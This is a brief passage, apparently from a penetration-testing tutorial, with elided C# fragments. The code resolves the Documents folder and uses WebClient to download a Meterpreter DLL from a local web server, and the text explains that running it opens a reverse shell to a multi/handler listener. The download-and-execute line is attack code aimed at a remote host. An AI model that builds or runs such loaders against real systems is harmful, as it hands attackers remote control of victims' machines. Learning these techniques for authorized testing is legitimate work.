...
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
		...
		wc.DownloadFile("http://192.168.x.x/met.dll", dllName);
...
When we compile and execute the completed code, it fetches the Meterpreter DLL from the web server and give us a reverse shell in our multi/handler listener.